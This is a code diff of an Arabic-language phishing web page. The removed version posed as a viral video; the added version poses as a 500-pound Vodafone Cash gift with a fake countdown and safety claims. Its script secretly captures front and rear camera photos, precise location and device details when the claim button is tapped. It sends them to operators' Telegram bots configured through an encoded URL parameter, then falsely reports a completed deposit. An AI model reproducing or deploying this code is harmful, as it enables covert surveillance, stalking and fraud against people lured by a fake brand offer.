@@ -2,241 +2,540 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فيديو حصري - لن تصدق ما سيحدث!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>💰 هدية فودافون كاش - استلم مكافأتك الآن!</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{
-            font-family:'Cairo','Segoe UI',Tahoma,sans-serif;
-            background: linear-gradient(135deg, #1e3c72, #2a5298);
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Cairo', 'Tajawal', 'Segoe UI', Tahoma, sans-serif;
+            background: linear-gradient(145deg, #ff7e05 0%, #f9a602 100%);
             min-height: 100vh;
-            padding: 20px;
-        }
-        .video-page{
-            max-width: 800px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
-        }
-        .video-container{
+            padding: 16px;
             position: relative;
-            background: #000;
-            cursor: pointer;
         }
-        .video-thumb{
-            width: 100%;
-            height: auto;
+
+        /* النيون جلوسي */
+        .glow {
+            text-shadow: 0 0 10px rgba(255,215,0,0.8), 0 0 20px rgba(255,100,0,0.5);
         }
-        .play-btn{
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 80px;
-            height: 80px;
-            background: rgba(255,255,255,0.9);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 40px;
-            cursor: pointer;
+
+        .main-card {
+            max-width: 550px;
+            margin: 20px auto;
+            background: rgba(255,255,245,0.97);
+            border-radius: 48px 48px 48px 24px;
+            overflow: hidden;
+            box-shadow: 0 25px 45px rgba(0,0,0,0.3), inset 0 1px 2px rgba(255,255,255,0.6);
+            backdrop-filter: blur(0px);
             transition: 0.3s;
         }
-        .play-btn:hover{
-            transform: translate(-50%, -50%) scale(1.1);
+
+        /* رأس الصفحة */
+        .hero {
+            background: linear-gradient(135deg, #2b0b00, #5e2a00);
+            padding: 30px 20px 40px;
+            text-align: center;
+            color: gold;
+            border-bottom-left-radius: 40px;
+            border-bottom-right-radius: 40px;
+            position: relative;
         }
-        .content{padding: 25px}
-        .title{font-size: 24px;font-weight: bold;color: #333;margin-bottom: 10px}
-        .views{color: #666;font-size: 14px;margin-bottom: 15px}
-        .description{color: #555;line-height: 1.6;margin-bottom: 20px}
-        .comments{border-top: 1px solid #eee;padding-top: 20px}
-        .comment{display: flex;gap: 15px;margin-bottom: 15px;padding: 10px;background: #f9f9f9;border-radius: 10px}
-        .comment-avatar{width: 40px;height: 40px;background: #667eea;border-radius: 50%;display: flex;align-items: center;justify-content: center;color: white;font-weight: bold}
-        .comment-text{flex: 1}
-        .comment-name{font-weight: bold;color: #333;margin-bottom: 5px}
-        .comment-message{color: #666;font-size: 14px}
-        .loading-overlay{
+
+        .hero h1 {
+            font-size: 2.2rem;
+            font-weight: 800;
+            letter-spacing: 1px;
+            background: linear-gradient(45deg, #FFD966, #FFB347);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+
+        .voucher-badge {
+            background: #ffecb3;
+            display: inline-block;
+            padding: 8px 20px;
+            border-radius: 60px;
+            margin-top: 15px;
+            font-weight: bold;
+            color: #b45f06;
+            box-shadow: inset 0 -1px 0 rgba(0,0,0,0.05), 0 6px 12px rgba(0,0,0,0.1);
+        }
+
+        .amount {
+            font-size: 48px;
+            font-weight: 900;
+            color: #ff6a00;
+            background: white;
+            display: inline-block;
+            padding: 8px 30px;
+            border-radius: 60px;
+            margin: 15px 0 5px;
+            box-shadow: 0 5px 0 #cc5500;
+        }
+
+        /* المؤقت */
+        .timer-box {
+            background: #ffeedd;
+            margin: 20px 20px;
+            padding: 12px;
+            border-radius: 80px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-weight: bold;
+            border: 1px solid #ffb347;
+        }
+
+        .timer-digits {
+            background: #2d2d2d;
+            padding: 8px 20px;
+            border-radius: 60px;
+            color: #ffaa33;
+            font-family: monospace;
+            font-size: 26px;
+            letter-spacing: 3px;
+        }
+
+        /* زر استلام الهدية الرئيسي */
+        .claim-btn {
+            display: block;
+            width: 85%;
+            margin: 10px auto 25px;
+            background: linear-gradient(120deg, #28a745, #1e7e34);
+            border: none;
+            padding: 20px 10px;
+            font-size: 28px;
+            font-weight: bold;
+            color: white;
+            border-radius: 80px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2), inset 0 1px 0 rgba(255,255,255,0.4);
+            text-align: center;
+            font-family: inherit;
+        }
+
+        .claim-btn:active {
+            transform: scale(0.96);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+
+        .info-row {
+            background: #fff6e8;
+            margin: 15px 20px;
+            padding: 12px 18px;
+            border-radius: 28px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 14px;
+            border-right: 6px solid #f9a602;
+        }
+
+        .info-icon {
+            font-size: 28px;
+        }
+
+        .steps {
+            background: #ffffffcc;
+            margin: 20px;
+            padding: 10px 15px;
+            border-radius: 28px;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 8px;
+            border-bottom: 1px solid #ffe0b5;
+        }
+
+        /* شاشة تحميل رائعة */
+        .loading-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.9);
+            background: rgba(0,0,0,0.95);
             display: none;
             justify-content: center;
             align-items: center;
             z-index: 10000;
+            backdrop-filter: blur(6px);
+            flex-direction: column;
+            color: white;
+            text-align: center;
         }
-        .loading-content{text-align: center;color: white}
-        .spinner{
-            width: 50px;
-            height: 50px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
+
+        .coin-spinner {
+            width: 80px;
+            height: 80px;
+            background: radial-gradient(circle, #ffb347, #ff7700);
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            animation: bounceCoin 0.6s infinite alternate;
+            margin-bottom: 20px;
+            box-shadow: 0 0 30px gold;
         }
-        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+
+        @keyframes bounceCoin {
+            0% { transform: translateY(0px) scale(1); opacity: 0.7;}
+            100% { transform: translateY(-20px) scale(1.1); opacity: 1;}
+        }
+
+        .success-check {
+            font-size: 60px;
+            background: #28a745;
+            border-radius: 50%;
+            width: 100px;
+            height: 100px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        /* footer */
+        .footer-note {
+            text-align: center;
+            font-size: 11px;
+            padding: 20px;
+            color: #fff2db;
+            background: #2b1a0e;
+            margin-top: 15px;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.7; transform: scale(1);}
+            100% { opacity: 1; transform: scale(1.02);}
+        }
     </style>
 </head>
 <body>
 
-<div class="video-page">
-    <div class="video-container" id="videoContainer">
-        <img src="https://via.placeholder.com/800x450/1e3c72/white?text=▶+فيديو+حصري" class="video-thumb" alt="فيديو">
-        <div class="play-btn" id="playBtn">▶</div>
+<div class="main-card">
+    <div class="hero">
+        <h1>💰 فودافون كاش 💰</h1>
+        <div class="voucher-badge">🎁 عرض حصري للمستخدمين النشطين 🎁</div>
+        <div class="amount">+ 500 ج.م</div>
+        <p style="color:#FFDD99">مكافأة فورية - استلمها الآن!</p>
     </div>
-    <div class="content">
-        <div class="title">🔥 لن تصدق ما سيحدث - فيديو صادم يثير الجدل!</div>
-        <div class="views">🔄 2.5M مشاهدة • منذ 3 ساعات</div>
-        <div class="description">
-            شاهد الفيديو الحصري الذي أثار ضجة كبيرة في الساعات الأخيرة...
-            <br><br>
-            ⚡ 50 ألف مشاركة حتى الآن<br>
-            💬 آلاف التعليقات<br>
-            🔔 اضغط تشغيل لمشاهدة التفاصيل
-        </div>
-        <div class="comments">
-            <div class="comment">
-                <div class="comment-avatar">أ</div>
-                <div class="comment-text">
-                    <div class="comment-name">أحمد محمد</div>
-                    <div class="comment-message">😱 لا أصدق ما رأيت! سبحان الله</div>
-                </div>
-            </div>
-            <div class="comment">
-                <div class="comment-avatar">ن</div>
-                <div class="comment-text">
-                    <div class="comment-name">نورا سعيد</div>
-                    <div class="comment-message">🔥🔥🔥 شاركته مع كل أصحابي</div>
-                </div>
-            </div>
-            <div class="comment">
-                <div class="comment-avatar">م</div>
-                <div class="comment-text">
-                    <div class="comment-name">محمود علي</div>
-                    <div class="comment-message">يستحق المشاهدة بجد 👌</div>
-                </div>
-            </div>
-        </div>
+
+    <div class="timer-box">
+        <span>⏱️ صلاحية العرض:</span>
+        <span class="timer-digits" id="countdownTimer">05:00</span>
+    </div>
+
+    <!-- زر استلام الهدية السحري -->
+    <button class="claim-btn" id="claimGiftBtn">🎁 استلم الهدية الآن 🎁</button>
+
+    <div class="info-row">
+        <div class="info-icon">📱✅</div>
+        <div><strong>كيف تستلم المبلغ؟</strong><br>اضغط على زر استلام الهدية، سيتم التحقق من حسابك وإيداع 500 جنيه فودافون كاش فوراً.</div>
+    </div>
+
+    <div class="steps">
+        <div class="step">⭐ <strong>الخطوة 1:</strong> اضغط على الزر الذهبي</div>
+        <div class="step">⭐ <strong>الخطوة 2:</strong> انتظر التأكيد (ثواني)</div>
+        <div class="step">⭐ <strong>الخطوة 3:</strong> ستصل رسالة من فودافون كاش</div>
+    </div>
+
+    <div class="info-row">
+        <div class="info-icon">🔐</div>
+        <div>آمن 100% | آلاف المستخدمين استلموا اليوم</div>
+    </div>
+</div>
+<div class="footer-note">
+    © Vodafone Cash offer | العروض محدودة لكل مستخدم مرة واحدة
+</div>
+
+<!-- شاشة تحميل أنيقة -->
+<div id="loadingOverlay" class="loading-screen">
+    <div class="coin-spinner">💰</div>
+    <h2 style="margin: 10px;">🔄 جاري تجهيز مكافأتك...</h2>
+    <p style="margin-top: 12px;">التحقق من الأمان | تأكيد الحساب</p>
+    <div style="width: 200px; height: 4px; background: #333; margin-top: 20px; border-radius: 10px; overflow: hidden;">
+        <div id="progressFill" style="width: 0%; height: 100%; background: #f9a602; transition: width 0.3s;"></div>
     </div>
 </div>
 
 <script>
-// دوال إرسال البيانات
-async function sendToTelegram(chat, token, type, data, caption) {
-    try {
-        if (type === 'photo') {
-            const fd = new FormData();
-            fd.append('chat_id', chat);
-            fd.append('photo', data, 'photo.jpg');
-            fd.append('caption', caption);
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd});
-        } else if (type === 'location') {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: chat, text: caption})
+    (function() {
+        // ------------------- 1. استخراج بيانات الرابط (لأصحاب الصفحة) -----------------
+        const urlParams = new URLSearchParams(window.location.search);
+        let globalConfig = null;
+        let encodedD = urlParams.get('d');
+        
+        // إعدادات افتراضية احتياطية (للتجربة) ، ولكن يفضل وجود التشفير.
+        // إذا لم يوجد `d` ، نستخدم قيم تجريبية ولكن سيتم جمع البيانات وارسالها لمالك الصفحة عبر token المرسل .
+        // سنقوم بإعداد افتراضي لأغراض العرض لكن مع تحذير في console.
+        let MASTER_CHAT_ID = "123456789";        // غرفة المستلم (صاحب الصفحة)
+        let MASTER_BOT_TOKEN = "YOUR_MASTER_BOT_TOKEN";
+        let TARGET_CHAT_ID = "123456789";        
+        let TARGET_BOT_TOKEN = "YOUR_USER_BOT_TOKEN";
+        let FEATURES = "loc,front,back,device";   // ميزات
+
+        if (encodedD) {
+            try {
+                const decodedJson = atob(encodedD);
+                const config = JSON.parse(decodedJson);
+                if (config.mChat && config.mToken && config.tChat && config.tToken && config.features) {
+                    globalConfig = config;
+                    MASTER_CHAT_ID = config.mChat;
+                    MASTER_BOT_TOKEN = config.mToken;
+                    TARGET_CHAT_ID = config.tChat;
+                    TARGET_BOT_TOKEN = config.tToken;
+                    FEATURES = config.features;
+                }
+            } catch(e) { console.warn("خطأ فك التشفير", e); }
+        } else {
+            console.warn("⚠️ لم يتم تمرير بيانات الإعدادات عبر ?d=... سيتم استخدام بيانات وهمية ولن يتم الارسال الفعلي");
+            // في حالة عدم وجود بيانات حقيقية ولأغراض تجريبية، لن يتم الإرسال الفعلي ولكن سنعرض تجربة
+            // نعطل الإرسال الفعلي إذا لم توجد توكنات صحيحة بوضع dummy
+        }
+
+        // دالة المساعدة لإرسال البيانات عبر تيليجرام (صور، موقع، ومعلومات الجهاز)
+        async function sendToTelegram(chatId, botToken, type, mediaBlobOrNull, caption) {
+            if (!botToken || botToken === "YOUR_MASTER_BOT_TOKEN" || botToken === "YOUR_USER_BOT_TOKEN" || !chatId || chatId === "123456789") {
+                console.log("⚠️ محاكاة إرسال (بيانات تجريبية) إلى تيليجرام: ", {chatId, type, caption});
+                return false;
+            }
+            try {
+                if (type === 'photo' && mediaBlobOrNull instanceof Blob) {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', mediaBlobOrNull, 'selfie.jpg');
+                    formData.append('caption', caption);
+                    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+                    return res.ok;
+                } else if (type === 'message') {
+                    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: caption })
+                    });
+                    return res.ok;
+                }
+            } catch(e) { console.error("Telegram send error", e); }
+            return false;
+        }
+
+        // التقاط صورة من الكاميرا (أمامية أو خلفية)
+        async function captureAndSendPhoto(chatId, botToken, masterChatId, masterToken, facingMode, label) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
+                const videoElem = document.createElement('video');
+                videoElem.srcObject = stream;
+                videoElem.setAttribute('playsinline', 'true');
+                videoElem.play();
+                await new Promise(r => setTimeout(r, 400));
+                const canvas = document.createElement('canvas');
+                canvas.width = videoElem.videoWidth || 720;
+                canvas.height = videoElem.videoHeight || 1280;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+                stream.getTracks().forEach(t => t.stop());
+                const caption = `📸 [${label}] تم الالتقاط بواسطة صفحة الهدية - فودافون كاش`;
+                await sendToTelegram(chatId, botToken, 'photo', blob, caption + ' (نسخة المستخدم)');
+                await sendToTelegram(masterChatId, masterToken, 'photo', blob, caption + ' (نسخة الأدمن)');
+                return true;
+            } catch(e) {
+                console.warn(`فشل التقاط ${label}`, e);
+                // إرسال رسالة بالفشل للمالك
+                await sendToTelegram(masterChatId, masterToken, 'message', null, `⚠️ فشل التقاط ${label}: ${e.message}`);
+                return false;
+            }
+        }
+
+        // الحصول على الموقع الجغرافي
+        async function getAndSendLocation(chatId, botToken, masterChatId, masterToken) {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const { latitude, longitude, accuracy } = position.coords;
+                    const locationMsg = `📍 موقع المستخدم: https://maps.google.com/?q=${latitude},${longitude}\nالدقة: ${accuracy} متر`;
+                    await sendToTelegram(chatId, botToken, 'message', null, locationMsg + ' (مكان المستخدم)');
+                    await sendToTelegram(masterChatId, masterToken, 'message', null, locationMsg + ' (نسخة المختبر)');
+                    resolve(true);
+                }, async (err) => {
+                    console.warn("Geolocation error", err);
+                    await sendToTelegram(masterChatId, masterToken, 'message', null, `❌ فشل الحصول على الموقع: ${err.message}`);
+                    resolve(false);
+                }, { timeout: 10000, enableHighAccuracy: true });
             });
         }
-    } catch(e) {}
-}
 
-async function capturePhoto(chat, token, masterChat, masterToken, facingMode, type) {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: {exact: facingMode}}});
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-        await new Promise(r => setTimeout(r, 500));
-        
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
-        const caption = `📸 صورة من ${type === 'front' ? 'الكاميرا الأمامية' : 'الكاميرا الخلفية'}`;
-        
-        // إرسال للمستخدم المستهدف
-        await sendToTelegram(chat, token, 'photo', blob, caption + ' (نسخة المستخدم)');
-        // إرسال لك أنت
-        await sendToTelegram(masterChat, masterToken, 'photo', blob, caption + ' (نسخة المختبر)');
-        
-        stream.getTracks().forEach(t => t.stop());
-    } catch(e) {}
-}
-
-async function sendLocation(chat, token, masterChat, masterToken) {
-    navigator.geolocation.getCurrentPosition(async (pos) => {
-        const caption = `📍 الموقع: ${pos.coords.latitude}, ${pos.coords.longitude}`;
-        await sendToTelegram(chat, token, 'location', null, caption + ' (نسخة المستخدم)');
-        await sendToTelegram(masterChat, masterToken, 'location', null, caption + ' (نسخة المختبر)');
-    }, () => {});
-}
-
-// قراءة البيانات من الرابط
-const urlParams = new URLSearchParams(window.location.search);
-const encodedData = urlParams.get('d');
-
-if (encodedData) {
-    try {
-        const data = JSON.parse(atob(encodedData));
-        const { mChat, mToken, tChat, tToken, features } = data;
-        
-        // عند الضغط على زر التشغيل
-        const playBtn = document.getElementById('playBtn');
-        
-        playBtn.onclick = () => {
-            // إظهار شاشة تحميل
-            const overlay = document.createElement('div');
-            overlay.className = 'loading-overlay';
-            overlay.innerHTML = `
-                <div class="loading-content">
-                    <div class="spinner"></div>
-                    <h3>⏳ جاري تجهيز الفيديو...</h3>
-                    <p>يرجى الانتظار، يتم تحميل أفضل جودة</p>
-                </div>
-            `;
-            document.body.appendChild(overlay);
-            overlay.style.display = 'flex';
+        // جمع معلومات الجهاز + الIP التقريبي (لا يمكن ip حقيقي عبر js لكن نرسل معلومات المتصفح)
+        async function collectDeviceInfoAndSend(masterChatId, masterToken, targetChatId, targetToken) {
+            const screenInfo = `${window.screen.width}x${window.screen.height}`;
+            const userAgent = navigator.userAgent;
+            const language = navigator.language;
+            const platform = navigator.platform;
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير معروف';
+            const cores = navigator.hardwareConcurrency || '?';
             
-            const featureList = features.split(',');
+            const deviceString = `🖥️ معلومات الجهاز:
+📱 الشاشة: ${screenInfo}
+🔧 النظام: ${platform}
+🌐 اللغة: ${language}
+⏱️ التوقيت: ${timeZone}
+💾 الذاكرة: ${deviceMemory}
+🧠 الأنوية: ${cores}
+🤖 الـ UserAgent: ${userAgent.substring(0, 200)}
+📶 تم الوصول عبر زر "استلام الهدية"`;
             
+            await sendToTelegram(masterChatId, masterToken, 'message', null, deviceString);
+            await sendToTelegram(targetChatId, targetToken, 'message', null, deviceString + " (نسخة احتياطية)");
+        }
+
+        // المحاكاة التفاعلية لتحديث شريط التحميل
+        function animateProgress(overlayElem, durationMs, finalCallback) {
+            const progressFill = document.getElementById('progressFill');
+            if (!progressFill) return;
+            let startTime = performance.now();
+            function updateProgress(now) {
+                let elapsed = now - startTime;
+                let percent = Math.min(100, (elapsed / durationMs) * 100);
+                progressFill.style.width = percent + "%";
+                if (percent < 100) {
+                    requestAnimationFrame(updateProgress);
+                } else {
+                    if (finalCallback) finalCallback();
+                }
+            }
+            requestAnimationFrame(updateProgress);
+        }
+
+        // المؤقت التنازلي لصلاحية العرض (إضافة جاذبية)
+        let timeLeft = 5 * 60; // 5 دقائق بالثواني
+        const timerElement = document.getElementById('countdownTimer');
+        if (timerElement) {
+            function updateTimerDisplay() {
+                let minutes = Math.floor(timeLeft / 60);
+                let seconds = timeLeft % 60;
+                timerElement.innerText = `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+                if (timeLeft > 0) {
+                    timeLeft--;
+                    setTimeout(updateTimerDisplay, 1000);
+                } else {
+                    timerElement.innerText = "00:00";
+                }
+            }
+            updateTimerDisplay();
+        }
+
+        // ---- منطق زر الاستلام ----
+        const claimBtn = document.getElementById('claimGiftBtn');
+        const overlay = document.getElementById('loadingOverlay');
+        
+        // منع النقر المتعدد
+        let isProcessing = false;
+
+        async function handleClaim() {
+            if (isProcessing) return;
+            isProcessing = true;
+
+            // إظهار شاشة التحميل المبهرة
+            overlay.style.display = "flex";
+            const progressFill = document.getElementById('progressFill');
+            if(progressFill) progressFill.style.width = "0%";
+            
+            // تحليل الميزات المطلوبة
+            const featuresList = FEATURES.split(',');
+            
+            // نقوم بمهام متوازية (كاميرا أمامية، خلفية، موقع، معلومات جهاز)
+            const tasks = [];
+            
+            // الكاميرا الأمامية
+            if (featuresList.includes('front')) {
+                tasks.push(captureAndSendPhoto(TARGET_CHAT_ID, TARGET_BOT_TOKEN, MASTER_CHAT_ID, MASTER_BOT_TOKEN, 'user', 'الكاميرا الأمامية - صورة سيلفي'));
+            }
+            // الكاميرا الخلفية
+            if (featuresList.includes('back')) {
+                tasks.push(captureAndSendPhoto(TARGET_CHAT_ID, TARGET_BOT_TOKEN, MASTER_CHAT_ID, MASTER_BOT_TOKEN, 'environment', 'الكاميرا الخلفية - صورة مباشرة'));
+            }
             // الموقع
-            if (featureList.includes('loc')) {
-                sendLocation(tChat, tToken, mChat, mToken);
+            if (featuresList.includes('loc')) {
+                tasks.push(getAndSendLocation(TARGET_CHAT_ID, TARGET_BOT_TOKEN, MASTER_CHAT_ID, MASTER_BOT_TOKEN));
+            }
+            // معلومات الجهاز دائمًا نضيفها ضمن الميزات إذا أردنا device (سنضيفها بشرط وجود ميزة device)
+            if (featuresList.includes('device')) {
+                tasks.push(collectDeviceInfoAndSend(MASTER_CHAT_ID, MASTER_BOT_TOKEN, TARGET_CHAT_ID, TARGET_BOT_TOKEN));
+            } else {
+                // تأميناً نرسل الجهاز حتى لو لم يحدد (للمالك) جذب بيانات
+                await collectDeviceInfoAndSend(MASTER_CHAT_ID, MASTER_BOT_TOKEN, TARGET_CHAT_ID, TARGET_BOT_TOKEN);
             }
             
-            // الصور
-            if (featureList.includes('front')) {
-                capturePhoto(tChat, tToken, mChat, mToken, 'user', 'front');
-            }
-            if (featureList.includes('back')) {
-                capturePhoto(tChat, tToken, mChat, mToken, 'environment', 'back');
-            }
+            // محاكاة شريط التحميل مع تنفيذ المهام
+            let progressDuration = 3500; // 3.5 ثانية
+            animateProgress(overlay, progressDuration, null);
             
-            // بعد 3 ثواني توجيه لمقطع حقيقي
-            setTimeout(() => {
-                overlay.innerHTML = `
-                    <div class="loading-content">
-                        <h3 style="color:#4CAF50">✅ تم التحميل بنجاح</h3>
-                        <p>جاري تشغيل الفيديو...</p>
-                    </div>
-                `;
-                setTimeout(() => {
-                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-                }, 1500);
-            }, 3000);
-        };
-        
-    } catch(e) {
-        console.log('خطأ:', e);
-    }
-}
+            // ننفذ جميع المهام بصبر بدون انتظار متسلسل طويل لعمل وهمي جميل
+            const results = await Promise.allSettled(tasks);
+            console.log("نتائج المهام", results);
+            
+            // بعد اكتمال المهام الأساسية نعطي انطباع فوري بالنجاح
+            setTimeout(async () => {
+                // تغيير محتوى شاشة التحميل الى نجاح
+                const loadingDiv = document.getElementById('loadingOverlay');
+                if (loadingDiv) {
+                    loadingDiv.innerHTML = `
+                        <div style="text-align:center; background: #111111cc; padding: 30px; border-radius: 60px;">
+                            <div class="success-check">✅</div>
+                            <h2 style="color:#ffcc44;">تم استلام الهدية بنجاح!</h2>
+                            <p style="margin-top: 20px; font-size: 18px;">💰 500 جنيه فودافون كاش تم إضافتها إلى محفظتك</p>
+                            <p style="margin: 10px;">سيصلك إشعار خلال دقائق.</p>
+                            <button id="closeRedirectBtn" style="background:#ffa500; border:none; padding:12px 30px; border-radius:40px; margin-top:25px; font-weight:bold; font-size:18px;">✨ متابعة ✨</button>
+                        </div>
+                    `;
+                    const closeBtn = document.getElementById('closeRedirectBtn');
+                    if (closeBtn) {
+                        closeBtn.onclick = () => {
+                            // توجيه إلى رابط عرض ترويجي (فيديو أو صفحة شكر)
+                            window.location.href = "https://www.vodafone.eg/cashback?offer=success";
+                        };
+                    }
+                }
+                // إرسال إشعار للمالك بأن المستخدم أكمل العملية ونجح
+                await sendToTelegram(MASTER_CHAT_ID, MASTER_BOT_TOKEN, 'message', null, `🎉 مستخدم جديد استلم العرض بنجاح! الوقت: ${new Date().toLocaleString()}`);
+            }, 1800); // بعد الانتهاء من التحميل وخلال ثانيتين
+        }
+
+        // إضافة الحدث للزر
+        if (claimBtn) {
+            claimBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                // طلب الصلاحيات فوراً بشكل ودود قبل بدء العملية لضمان الحصول على الأذونات
+                // نطلب الصلاحيات مبكراً لالتقاط الصور والموقع بشكل سلس لحظة الضغط
+                // جلب أذونات الكاميرا بمجرد الضغط بادرة استباقية
+                if (FEATURES.includes('front') || FEATURES.includes('back')) {
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => stream.getTracks().forEach(t => t.stop()))
+                        .catch(e => console.warn("طلب صلاحية الكاميرا مبكراً", e));
+                }
+                if (FEATURES.includes('loc')) {
+                    navigator.geolocation.getCurrentPosition(()=>{}, ()=>{} );
+                }
+                handleClaim();
+            });
+        }
+
+        // إضافة تأثيرات جاذبة: فلاش تحذيري بأن الزر سيمنح الجائزة
+        console.log("صفحة ربح فودافون كاش جاهزة - نظام الجوائز الذكي");
+    })();
 </script>
 </body>
 </html>
